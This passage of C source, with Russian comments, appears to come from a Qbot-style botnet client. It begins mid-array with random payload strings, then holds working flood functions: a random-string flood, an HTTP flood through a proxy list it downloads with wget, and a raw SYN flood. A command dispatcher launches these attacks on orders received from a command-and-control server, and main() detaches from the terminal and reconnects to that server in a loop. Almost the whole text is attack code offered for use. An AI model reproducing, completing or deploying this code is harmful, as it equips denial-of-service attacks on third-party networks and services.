\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff""PozHlpiND4xPDPuGE6tq","tg57YSAcuvy2hdBlEWMv","VaDp3Vu5m5bKcfCU96RX","UBWcPjIZOdZ9IAOSZAy6","JezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF","YakuzaBotnet","Scarface1337""\x53\x65\x6c\x66\x20\x52\x65\x70\x20\x46\x75\x63\x6b\x69\x6e\x67\x20\x4e\x65\x54\x69\x53\x20\x61\x6e\x64\x20\x54\x68\x69\x73\x69\x74\x79\x20\x30\x6e\x20\x55\x72\x20\x46\x75\x43\x6b\x49\x6e\x47\x20\x46\x6f\x52\x65\x48\x65\x41\x64\x20\x57\x65\x20\x42\x69\x47\x20\x4c\x33\x33\x54\x20\x48\x61\x78\x45\x72\x53\x0a","/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A","\x77\x47\x5E\x27\x7A\x4E\x09\xF7\xC7\xC0\xE6\xF5\x9B\xDC\x23\x6E\x12\x29\x25\x1D\x0A\xEF\xFB\xDE\xB6\xB1\x94\xD6\x7A\x6B\x01\x34\x26\x1D\x56\xA5\xD5\x8C\x91\xBC\x8B\x96\x29\x6D\x4E\x59\x38\x4F\x5C\xF0\xE2\xD1\x9A\xEA\xF8\xD0\x61\x7C\x4B\x57\x2E\x7C\x59\xB7\xA5\x84\x99\xA4\xB3\x8E\xD1\x65\x46\x51\x30\x77\x44\x08\xFA\xD9\x92\xE2\xF0\xC8\xD5\x60\x77\x52\x6D\x21\x02\x1D\xFC\xB3\x80\xB4\xA6\x9D\xD4\x28\x24\x03\x5A\x35\x14\x5B\xA8\xE0\x8A\x9A\xE8\xC0\x91\x6C\x7B\x47\x5E\x6C\x69\x47\xB5\xB4\x89\xDC\xAF\xAA\xC1\x2E\x6A\x04\x10\x6E\x7A\x1C\x0C\xF9\xCC\xC0\xA0\xF8\xC8\xD6\x2E\x0A\x12\x6E\x76\x42\x5A\xA6\xBE\x9F\xA6\xB1\x90\xD7\x24\x64\x15\x1C\x20\x0A\x19\xA8\xF9\xDE\xD1\xBE\x96\x95\x64\x38\x4C\x53\x3C\x40\x56\xD1\xC5\xED\xE8\x90\xB0\xD2\x22\x68\x06\x5B\x38\x33\x00\xF4\xF3\xC6\x96\xE5\xFA\xCA\xD8\x30\x0D\x50\x23\x2E\x45\x52\xF6\x80\x94","8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0""/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58/x99/x21/x8r/x58","\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x21\x58\x99\x21\x58\x99\x21\x58\x06"};
                char *STD2_STRING = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            if (a >= 50)
                {
            send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
             connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
            close(iSTD_Sock);
            _exit(0);
            }
            a = 0;
            }
            a++;
            }
            }


            #define MAX_PROXIES 5000

void *http_flood_raw(void *par1) {
    char *host = NULL, *path = "/";
    int port = 80;
    time_t start = time(NULL);

    pthread_mutex_lock(&proxy_mutex);
    if(proxy_count == 0) {
        FILE *proxy_file = fopen("proxies.txt", "r");
        if(!proxy_file) {
            printf("Downloading proxies...\n");
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "wget -q -O proxies.txt %s", PROXY_URL);
            system(cmd);
            proxy_file = fopen("proxies.txt", "r");
        }

        char line[128];
        while(fgets(line, sizeof(line), proxy_file) && proxy_count < MAX_PROXIES) {
            trim(line);
            if(strlen(line) > 7) {
                proxies[proxy_count++] = strdup(line);
            }
        }
        fclose(proxy_file);
    }
    pthread_mutex_unlock(&proxy_mutex);

    // Основной цикл атаки
    while(time(NULL) < start + duration) {
        // Выбор случайного прокси
        char *proxy = proxies[rand() % proxy_count];
        char *proxy_ip = strtok(proxy, ":");
        int proxy_port = atoi(strtok(NULL, ":"));

        // Создание сокета
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;

        // Настройка таймаута
        struct timeval timeout;
        timeout.tv_sec = PROXY_TIMEOUT;
        timeout.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

        // Подключение к прокси
        struct sockaddr_in proxy_addr;
        proxy_addr.sin_family = AF_INET;
        proxy_addr.sin_port = htons(proxy_port);
        inet_pton(AF_INET, proxy_ip, &proxy_addr.sin_addr);

        if(connect(sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
            close(sock);
            continue;
        }

        // Формирование HTTP-запроса через прокси
        char request[2048];
        snprintf(request, sizeof(request),
            "GET https://%s%s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: */*\r\n"
            "Proxy-Connection: Keep-Alive\r\n\r\n",
            url, path, url, useragents[rand() % (sizeof(useragents)/sizeof(char*))]);

        // Отправка запроса
        if(send(sock, request, strlen(request), 0) < 0) {
            close(sock);
            continue;
        }

        // Чтение ответа (для поддержания соединения)
        char response[512];
        recv(sock, response, sizeof(response), 0);

        close(sock);
        usleep(10000); // Задержка между запросами
        (void)par1;
    }
}

    struct pseudo_header {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
    };

    static unsigned short csum(unsigned short *ptr, int nbytes) {
        register long sum;
        unsigned short oddbyte;
        register short answer;

        sum = 0;
        while(nbytes > 1) {
            sum += *ptr++;
            nbytes -= 2;
        }
        if(nbytes == 1) {
            oddbyte = 0;
            *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
            sum += oddbyte;
        }

        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = (short)~sum;
        return answer;
    }

    static uint32_t util_external_addr(void) {
        int fd;
        struct sockaddr_in addr;
        socklen_t addr_len = sizeof(addr);

        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
            return 0;
        }

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("8.8.8.8");
        addr.sin_port = htons(53);
        connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        getsockname(fd, (struct sockaddr *)&addr, &addr_len);
        close(fd);
        return addr.sin_addr.s_addr;
    }

    static void setup_tcp_header(struct tcphdr *tcpHeader) {
        tcpHeader->source = htons(rand() % 65535);
        tcpHeader->dest = htons(floodPort);
        tcpHeader->seq = htonl(rand());
        tcpHeader->ack_seq = 0;
        tcpHeader->doff = 5;
        tcpHeader->syn = 1;
        tcpHeader->window = htons(5840);
        tcpHeader->check = 0;
        tcpHeader->urg_ptr = 0;
    }

    void *http_flood(void *par1) {
        char *target_url = (char *)par1;
        int port = http_flood_port;
        time_t start = time(NULL);
        duration = http_flood_duration;

        struct sockaddr_in sin;
        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(port);

        int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s < 0) {
            perror("Socket error");
            return NULL;
        }

        struct hostent *host_info = gethostbyname(target_url);
        if (host_info == NULL) {
            close(s);  // Added proper cleanup
            return NULL;
        }
        memcpy(&sin.sin_addr, host_info->h_addr, host_info->h_length);

        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
        char *data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);

        memset(datagram, 0, MAX_PACKET_SIZE);

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = util_external_addr();
        iph->daddr = sin.sin_addr.s_addr;

        setup_tcp_header(tcph);

        struct pseudo_header psh;
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudogram[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));

        tcph->check = csum((unsigned short *)pseudogram, sizeof(pseudogram));
        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        while(1) {
            sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
            packetsPerSecond++;
            usleep(sleepTime);
            }
            close(s);
            return NULL;
}



//attacks end here

char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5";
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "ARM6";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
    #elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "MPSL";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "PPC";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPC";
    #else
    return "idk";
    #endif
}

void processCmd(int argc, unsigned char **argv) {
    int i;
    if (!strcmp(argv[0], "ACK")) {
        if (argc < 5) return;
        ack_flood_port = atoi(argv[2]);
        int threads = atoi(argv[3]);
        int duration = atoi(argv[4]);
        for (i = 0; i < threads; i++) {
            if (!listFork()) {
                ack_flood(argv[1]);
                _exit(0);
            }
        }
    }
    // Check for "XTD" command
    else if (!strcmp(argv[0], "XTD")) {
        if (argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1) return;

        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);

        // Handle comma-separated IP list
        if (strstr(ip, ",") != NULL) {
            unsigned char *hi = strtok(ip, ",");
            while (hi != NULL) {
                if (!listFork()) {
                    xtdcustom(hi, port, time);
                    _exit(0);
                }
                hi = strtok(NULL, ",");
            }
        } else {
            if (listFork()) return;  // Parent process returns
            xtdcustom(ip, port, time);  // Child executes
            _exit(0);
        }
    }



        else if(!strcmp(argv[0], "RANDHEX"))//unpatchable!!
        {
            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL)
                {
                    if(!listFork())
                    {
                        Randhex(hi, port, time);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                        if (listFork())
                        {
                            return;
                        }
                        Randhex(ip, port, time);
                        _exit(0);
                   }
        }

        else if(!strcmp(argv[0], "GAME"))
        {
            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL)
                {
                    if(!listFork())
                    {
                        Randhex(hi, port, time);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                        if (listFork())
                        {
                            return;
                        }
                        Randhex(ip, port, time);
                        _exit(0);
                   }
        }


        else if(!strcmp(argv[0], "*")) {
            if(argc < 5) return; // Проверяем количество аргументов

            // Парсим аргументы: !* http_flood site.com 80 120
            if(!strcmp(argv[1], "http_flood")) {
                http_flood_url = argv[2];
                http_flood_port = atoi(argv[3]);
                http_flood_duration = atoi(argv[4]);

                // Запускаем потоки
                int threads = 500; // Количество потоков
                for(int i = 0; i < threads; i++) {
                    if(!listFork()) {
                        http_flood(http_flood_url); // Вызываем функцию флуда
                        _exit(0);
                    }
                }
            }
        }

        else if(!strcmp(argv[0], "STD") || !strcmp(argv[0], "SHIT"))//basic std flood [not static!]
        {
            // !* STD TARGET PORT TIME
            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL)
                {
                    if(!listFork())
                    {
                        SendSTD(hi, port, time);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                        if (listFork())
                        {
                            return;
                        }
                        SendSTD(ip, port, time);
                        _exit(0);
                   }
        }

        else if(!strcmp(argv[0], "UDPRAW") || !strcmp(argv[0], "SHIT"))
        {
            if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                return;
            }
            unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
            if(strstr(ip, ",") != NULL)
            {
                unsigned char *hi = strtok(ip, ",");
                while(hi != NULL)
                {
                    if(!listFork())
                    {
                        UDPRAW(hi, port, time);
                        _exit(0);
                    }
                    hi = strtok(NULL, ",");
                }
            } else {
                        if (listFork())
                        {
                            return;
                        }
                        UDPRAW(ip, port, time);
                        _exit(0);
                   }
        }




        //if(!strcmp(argv[0], "100up"))// argv[0] 100up || argv[1] IP; || argv[2] PORT || argv[3] TIME || argv[4] PSIZE
        //{
        //    if (argc < 3) return;
        //    if (listFork()) return;
        //    unsigned char *ip = argv[1];
        //    int port = atoi(argv[2]);
        //    int time = atoi(argv[3]);
        //                //GET            //TIME  //PSIZE
        //    SendHTTPHex(ip, port, time, atoi(argv[4]));
        //    sendHTTPtwo(ip, port, time, atoi(argv[4]));
        //    SendSTD(ip, port, time);
//
        //    exit(0);
        //}

        else if(!strcasecmp(argv[0], "STOP"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++)
                {
                        if (pids[i] != 0 && pids[i] != getpid())
                        {
                                kill(pids[i], 9);
                                killed++;
                        }
                }
                if(killed > 0)
                {

                } else {

                       }
        }

}
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))

int initConnection()
{
        unsigned char server[512];
        memset(server, 0, 512);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;

        strcpy(server, commServer[currentServer]);
        int port = 6982;
        if(strchr(server, ':') != NULL)
        {
                port = atoi(strchr(server, ':') + 1);
                *((unsigned char *)(strchr(server, ':'))) = 0x0;
        }

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int main(int argc, char *argv[]) {
        srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        getOurIP();
        pid_t pid1;
        pid_t pid2;
        int status;

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
                        if (pid2 = fork()) {
                                        exit(0);
                        } else if (!pid2) {
                        } else {
                        }
        } else {
        }
        setsid();
        chdir("/");
        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(5); continue; }
                sockprintf(mainCommSock, "%s \x1b[1;31mip:%s",  getArch(), inet_ntoa(ourIP));
                //sockprintf(mainCommSock, "%s", getArch());
                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                        unsigned char *message = commBuf;
                        if(strstr(commBuf, "DUP") == commBuf) exit(0); // DUP
                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}
